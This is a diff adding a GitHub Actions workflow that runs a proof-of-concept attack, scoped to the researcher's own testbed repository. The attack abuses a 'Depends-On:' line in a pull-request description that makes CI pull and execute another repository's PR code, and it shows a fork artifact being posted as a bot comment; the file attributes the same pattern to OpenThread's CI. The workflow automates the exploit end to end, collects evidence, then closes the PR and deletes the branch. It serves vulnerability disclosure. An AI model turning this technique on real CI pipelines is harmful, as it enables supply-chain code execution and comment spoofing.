@@ -1,0 +1,266 @@
+﻿name: Attack Trigger
+
+# Research tooling for the OpenThread "Depends-On:" pull-request-body directive
+# finding. Runs the attack end to end on this (operator-owned) testbed and posts
+# the evidence back into the issue thread that triggered it.
+#
+# Guardrails:
+#   * trigger is the exact comment text "/attack" (or a manual workflow_dispatch)
+#   * it only ever touches THIS repository (plus reading the public sibling repo)
+#   * it never touches any third-party or Google-owned repository
+#   * it always cleans up: the attack PR is closed and the branch is deleted
+#
+# Two tokens are used:
+#   secrets.ATTACK_TOKEN  - fine-grained PAT (Contents: R/W, Pull requests: R/W on
+#                           this repo only). Needed to open the pull request, because
+#                           a pull request opened with GITHUB_TOKEN does not trigger
+#                           pull_request workflows (GitHub anti-recursion rule).
+#   secrets.GITHUB_TOKEN  - the repo's own token, used for reading runs/logs/comments.
+
+on:
+  issue_comment:
+    types: [created]
+  workflow_dispatch:
+    inputs:
+      self_test:
+        description: "self_test = only verify that ATTACK_TOKEN is accepted"
+        required: false
+        default: "false"
+
+permissions:
+  actions: read
+  contents: read
+  issues: write
+  pull-requests: write
+
+env:
+  REPO: SlackerManTesting/ci-depends-on-repro
+  SIB: SlackerManTesting/ci-depends-on-sib
+  SIB_PR: "1"
+
+jobs:
+  attack:
+    if: >-
+      github.event_name == 'workflow_dispatch' ||
+      (github.event.issue.pull_request == null && github.event.issue.comment.body.trim() == '/attack')
+    runs-on: ubuntu-24.04
+    steps:
+      - name: Auth check
+        id: auth
+        env:
+          GH_TOKEN: ${{ secrets.ATTACK_TOKEN }}
+        run: |
+          set -euo pipefail
+          if [ -z "${GH_TOKEN:-}" ]; then
+            echo "::error::ATTACK_TOKEN secret is not set on this repository"
+            exit 1
+          fi
+          login="$(gh api user --jq .login 2>/dev/null || echo unknown)"
+          echo "ATTACK_TOKEN accepted (login: ${login})" >> "$GITHUB_STEP_SUMMARY"
+          echo "login=${login}" >> "$GITHUB_OUTPUT"
+
+      - name: Self test only
+        if: inputs.self_test == 'true'
+        run: |
+          echo "self test complete - ATTACK_TOKEN works" >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Check sibling pull request is open
+        id: sibling
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          state="$(gh api "repos/${SIB}/pulls/${SIB_PR}" --jq .state)"
+          echo "sibling PR ${SIB}#${SIB_PR} state=${state}" >> "$GITHUB_STEP_SUMMARY"
+          if [ "${state}" != "open" ]; then
+            echo "::error::sibling PR #${SIB_PR} is '${state}' - it must stay OPEN: the directive pulls refs/pull/${SIB_PR}/merge from that repository"
+            exit 1
+          fi
+
+      - name: Open the attack pull request
+        id: pr
+        env:
+          GH_TOKEN: ${{ secrets.ATTACK_TOKEN }}
+        run: |
+          set -euo pipefail
+          n="$(date +%s)"
+          branch="poc/attack-${n}"
+          echo "branch=${branch}" >> "$GITHUB_ENV"
+
+          work="$(mktemp -d)"
+          cd "$work"
+          git init -q .
+          git remote add origin "https://x-access-token:${GH_TOKEN}@github.com/${REPO}.git"
+          git fetch -q --depth 1 origin main
+          git checkout -q -b "${branch}" FETCH_HEAD
+          printf 'attack-trigger demo %s (inert file; the payload lives in the sibling repository)\n' "$(date -u +%FT%TZ)" > poc-note.txt
+          git add poc-note.txt
+          git -c user.name="attack-trigger" -c user.email="attack-trigger@users.noreply.github.com" commit -qm "poc: inert marker file"
+          git push -q origin "${branch}"
+
+          body="$(printf '%s\n\n%s\n' \
+            "This pull request description is the attack vector: the Depends-On line below selects" \
+            "a pull request from ANOTHER repository (${SIB}#${SIB_PR}); CI pulls its merge ref and runs its code." \
+            "Depends-On: ${SIB}#${SIB_PR}")"
+
+          pr_json="$(gh api --method POST "repos/${REPO}/pulls" \
+            -f title="poc: attack trigger demo (${n})" \
+            -f head="${branch}" \
+            -f base=main \
+            -f body="${body}")"
+          pr_number="$(printf '%s' "$pr_json" | jq -r .number)"
+          pr_url="$(printf '%s' "$pr_json" | jq -r .html_url)"
+          echo "pr_number=${pr_number}" >> "$GITHUB_OUTPUT"
+          echo "pr_url=${pr_url}" >> "$GITHUB_OUTPUT"
+          echo "opened ${pr_url} (branch ${branch})" >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Wait for the consumer run
+        id: wait1
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
+          BRANCH: ${{ env.branch }}
+        run: |
+          set -euo pipefail
+          run_id=""
+          for i in $(seq 1 40); do
+            run_id="$(gh api "repos/${REPO}/actions/runs?branch=${BRANCH}&event=pull_request&per_page=30" \
+              --jq '[.workflow_runs[] | select(.name=="CI Consumer")] | sort_by(.created_at) | last | .id // empty')"
+            if [ -n "$run_id" ]; then
+              conclusion="$(gh api "repos/${REPO}/actions/runs/${run_id}" --jq '.conclusion // .status')"
+              if [ "${conclusion}" = "success" ] || [ "${conclusion}" = "failure" ] || [ "${conclusion}" = "completed" ]; then
+                break
+              fi
+            fi
+            sleep 10
+          done
+          if [ -z "$run_id" ]; then echo "::error::no CI Consumer run appeared for ${BRANCH}"; exit 1; fi
+          echo "run_id=${run_id}" >> "$GITHUB_OUTPUT"
+          echo "consumer run id=${run_id}" >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Collect delivery + execution + artifact evidence
+        id: evidence
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          RUN_ID: ${{ steps.wait1.outputs.run_id }}
+        run: |
+          set -euo pipefail
+          gh api "repos/${REPO}/actions/runs/${RUN_ID}/logs" > run.log
+          {
+            echo "### 1. the directive selected a pull request from ANOTHER repository"
+            grep -nE "git pull .*pull/[0-9]+/merge" run.log | head -3 || true
+            echo
+            echo "### 2. the pulled code executed"
+            grep -nE "EXEC-STEP|ATTACKER-SCRIPT-EXECUTED" run.log | head -5 || true
+            echo
+            echo "### 3. the build report bytes (attacker content between the legitimate header and tail)"
+            sed -n '/REPORT-ARTIFACT-BEGIN/,/REPORT-ARTIFACT-END/p' run.log | head -40 || true
+          } > evidence.md
+          cat evidence.md >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Capture the CI bot comment
+        id: bot1
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
+        run: |
+          set -euo pipefail
+          found=""
+          for i in $(seq 1 24); do
+            found="$(gh api "repos/${REPO}/issues/${PR_NUMBER}/comments?per_page=100" \
+              --jq '[.[] | select(.user.login=="github-actions[bot]" and (((.body // "") | startswith("<!-- Size Report of **ACME-CI** -->"))))] | last | (.id // empty)')"
+            if [ -n "$found" ]; then break; fi
+            sleep 10
+          done
+          if [ -z "$found" ]; then echo "::error::no github-actions[bot] Size Report comment on PR ${PR_NUMBER}"; exit 1; fi
+          echo "comment_id=${found}" >> "$GITHUB_OUTPUT"
+          gh api "repos/${REPO}/issues/comments/${found}" --jq '"comment id=\(.id) created=\(.created_at) updated=\(.updated_at)\n\(.body)"' > bot-comment.md
+          cat bot-comment.md >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Second run - same comment id, rewritten in place
+        id: bot2
+        env:
+          GH_TOKEN: ${{ secrets.ATTACK_TOKEN }}
+          GH_READ: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
+          BRANCH: ${{ env.branch }}
+          FIRST_ID: ${{ steps.bot1.outputs.comment_id }}
+        run: |
+          set -euo pipefail
+          n="$(date +%s)"
+          work="$(mktemp -d)"
+          cd "$work"
+          git init -q .
+          git remote add origin "https://x-access-token:${GH_TOKEN}@github.com/${REPO}.git"
+          git fetch -q --depth 1 origin "${BRANCH}"
+          git checkout -q -b "tmp-${n}" FETCH_HEAD
+          printf 'attack-trigger demo second run %s\n' "$(date -u +%FT%TZ)" > poc-note.txt
+          git add poc-note.txt
+          git -c user.name="attack-trigger" -c user.email="attack-trigger@users.noreply.github.com" commit -qm "poc: second run"
+          # fast-forward the SAME branch so the pull_request workflow re-runs (synchronize)
+          git push -q origin "tmp-${n:-second}:${BRANCH}"
+
+          new_id=""
+          for i in $(seq 1 40); do
+            new_id="$(GH_TOKEN="${GH_READ}" gh api "repos/${REPO}/issues/${PR_NUMBER}/comments?per_page=100" \
+              --jq '[.[] | select(.user.login=="github-actions[bot]" and (.body | startswith("<!-- Size Report of **ACME-CI** -->")))] | last | (.id // empty)')"
+            updated="$(GH_TOKEN="${GH_READ}" gh api "repos/${REPO}/issues/comments/${new_id}" --jq '.updated_at' 2>/dev/null || echo "")"
+            if [ -n "${new_id}" ] && [ "${updated}" != "" ]; then
+              created="$(GH_TOKEN="${GH_READ}" gh api "repos/${REPO}/issues/comments/${new_id}" --jq '.created_at')"
+              if [ "${created}" != "${updated}" ]; then break; fi
+            fi
+            sleep 10
+          done
+          {
+            echo "### 4. the bot comment is rewritten IN PLACE on the next run (same id, created_at unchanged)"
+            echo "first run  comment id=${FIRST_ID}"
+            echo "second run comment id=${new_id}  created=$(GH_TOKEN="${GH_READ}" gh api "repos/${REPO}/issues/comments/${new_id}" --jq .created_at 2>/dev/null || echo '?')  updated=$(GH_TOKEN="${GH_READ}" gh api "repos/${REPO}/issues/comments/${new_id}" --jq .updated_at 2>/dev/null || echo '?')"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Post the evidence into the issue thread
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ISSUE: ${{ github.event.issue.number }}
+          PR_URL: ${{ steps.pr.outputs.pr_url }}
+          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
+          RUN_ID: ${{ steps.wait1.outputs.run_id }}
+        run: |
+          set -euo pipefail
+          {
+            echo "## Attack result â€” ran on GitHub just now"
+            echo
+            echo "Attack pull request: ${PR_URL}  (the \`Depends-On:\` line is in the **description**, not in the diff)"
+            echo "Consumer run: https://github.com/${REPO}/actions/runs/${RUN_ID}"
+            echo
+            cat evidence.md 2>/dev/null || echo "_(evidence collection did not complete)_"
+            echo
+            cat bot-comment.md 2>/dev/null || echo "_(bot comment not captured)_"
+            echo
+            echo "### 5. same code path in OpenThread's own CI"
+            echo "\`script/git-tool:45-50\` (this repo's copy is byte-identical to upstream) greps the PR body and runs"
+            echo "\`git pull --no-edit --no-rebase origin \"pull/N/merge\"\` inside a clone of another repository;"
+            echo "\`.github/workflows/size-report.yml:33-45\` (this repo's copy of that file) downloads the fork-produced"
+            echo "\`report_pr\` artifact in the base repo with \`pull-requests: write\` and posts the raw bytes as"
+            echo "\`github-actions[bot]\` (:96 body, :110 updateComment, :112 createComment)."
+            echo
+            echo "### cleanup"
+            echo "_this pull request is closed and the branch deleted by the trigger._"
+          } > comment.md
+          gh api --method POST "repos/${REPO}/issues/${ISSUE}/comments" -f body="$(cat comment.md)" > /dev/null
+          echo "posted evidence comment to issue #${ISSUE}"
+
+      - name: Cleanup - close the pull request and delete the branch
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.ATTACK_TOKEN }}
+          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
+          BRANCH: ${{ env.branch }}
+        run: |
+          set -euo pipefail
+          gh api --method POST "repos/${REPO}/issues/${PR_NUMBER}/comments" \
+            -f body="closing: research testbed PoC (evidence captured above)" > /dev/null || true
+          gh api --method PATCH "repos/${REPO}/pulls/${PR_NUMBER}" -f state=closed > /dev/null || true
+          git push -q "https://x-access-token:${GH_TOKEN}@github.com/${REPO}.git" --delete "${BRANCH}" 2>/dev/null || \
+            gh api --method DELETE "repos/${REPO}/git/refs/heads/${BRANCH}" > /dev/null || true
+          echo "cleanup done (PR ${PR_NUMBER} closed, branch ${BRANCH} deleted)"
